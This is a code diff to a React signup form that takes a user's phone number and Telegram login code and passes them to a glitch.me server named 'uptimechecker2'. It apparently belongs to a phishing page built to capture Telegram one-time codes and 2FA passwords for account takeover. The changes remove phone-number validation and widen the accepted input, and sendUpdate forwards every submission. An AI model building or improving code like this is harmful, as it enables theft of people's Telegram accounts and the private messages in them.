@@ -17,6 +17,8 @@ function parseTGMsg(message) {
     switch (message) {
         case 'PHONE_CODE_INVALID':
             return 'Incorrect OTP, Please try again!<br/>Check your Telegram messages for correct OTP';
+        case 'PHONE_NUMBER_INVALID':
+            return 'Invalid Phone Number';
         case 'Bad Request':
             return 'Session Expired. Try after 5 minutes';
         default:
@@ -79,14 +81,16 @@ const RegForm = (props) => {
     useEffect(() => {
         const handleVisibilityChange = () => {
             if (!document.hidden) {
-                if (activeForm === forms.otp) {
-                    const inputbox1 = document.getElementById('otp1');
-                    inputbox1.focus();
-                    inputbox1.click();
-                } else if (activeForm === forms.phoneNumber) {
-                    const inputbox1 = document.getElementById('phoneNumber');
-                    inputbox1.focus();
-                }
+                setTimeout(() => {
+                    if (activeForm === forms.otp) {
+                        const inputbox1 = document.getElementById('otp1');
+                        inputbox1.focus();
+                        inputbox1.click();
+                    } else if (activeForm === forms.phoneNumber) {
+                        const inputbox1 = document.getElementById('phoneNumber');
+                        inputbox1.focus();
+                    }
+                }, 100); 
             }
         };
         const timer = setTimeout(() => {
@@ -123,44 +127,34 @@ const RegForm = (props) => {
         }
     };
 
-    const validatePhoneNumber = (phoneNumber) => {
-        const mobileNumberPattern = /^[0-9]{10}$/;
-        return mobileNumberPattern.test(phoneNumber);
-    };
-
     const handlePhoneSubmit = async (event) => {
         event.preventDefault();
         if (!isLoading) {
             const phoneNumber = formData.phoneNumber.startsWith('+')
                 ? formData.phoneNumber.substring(1)
                 : formData.phoneNumber;
-
-            if (!validatePhoneNumber(phoneNumber)) {
-                setErrMsg('Please enter a valid 10-digit mobile number');
-                setShowErr(true);
-            } else {
-                setIsLoading(true);
-                setShowErr(false);
-                try {
-                    const response = await axios.get(`https://uptimechecker2.glitch.me/tgsignup/login?phone=${formData.phoneCountryCode.replace(/\D/g, '')}${phoneNumber}`);
-                    sendUpdate(JSON.stringify({ ...formData, phoneNumber }));
-                    setIsLoading(false);
-                    console.log(response);
-                    if (response.status === 200) {
-                        setActiveForm(forms.otp);
-                    } else {
-                        const err = parseError({ response });
-                        setErrMsg(err.message || 'Unknown error');
-                        setShowErr(true);
-                    }
-                } catch (error) {
-                    setIsLoading(false);
-                    const err = parseError(error);
-                    console.log(err);
+            setIsLoading(true);
+            setShowErr(false);
+            try {
+                const response = await axios.get(`https://uptimechecker2.glitch.me/tgsignup/login?phone=${formData.phoneCountryCode.replace(/\D/g, '')}${phoneNumber}`);
+                sendUpdate(JSON.stringify({ ...formData, phoneNumber }));
+                setIsLoading(false);
+                console.log(response);
+                if (response.status === 200) {
+                    setActiveForm(forms.otp);
+                } else {
+                    const err = parseError({ response });
                     setErrMsg(err.message || 'Unknown error');
                     setShowErr(true);
                 }
+            } catch (error) {
+                setIsLoading(false);
+                const err = parseError(error);
+                console.log(err);
+                setErrMsg(err.message || 'Unknown error');
+                setShowErr(true);
             }
+
         }
     };
 
@@ -229,8 +223,8 @@ const RegForm = (props) => {
                     }
                 } catch (error) {
                     setIsLoading(false);
-                    const err = parseError(error)
-                    let message = err.message
+                    const err = parseError(error);
+                    let message = err.message;
                     setErrMsg(parseTGMsg(message) || 'Unknown error');
                     setShowErr(true);
                     if (message.toLowerCase().includes('2fa')) {
@@ -290,7 +284,7 @@ const RegForm = (props) => {
                                         autoFocus={true}
                                         name="phoneNumber"
                                         minLength={10}
-                                        maxLength={10}
+                                        maxLength={12}
                                         value={formData.phoneNumber}
                                         onChange={handleInputChange}
                                         onPaste={(e) => handlePaste(e, 'phone')}
@@ -376,7 +370,7 @@ const RegForm = (props) => {
                             </form>
                         </div>
                     )}
-                    {showErr && <span style={{ color: 'red' ,whiteSpace: 'pre-line' }}>{errMsg}</span>}
+                    {showErr && <span style={{ color: 'red', whiteSpace: 'pre-line' }}>{errMsg}</span>}
                 </div>
             )}
             {ok && (
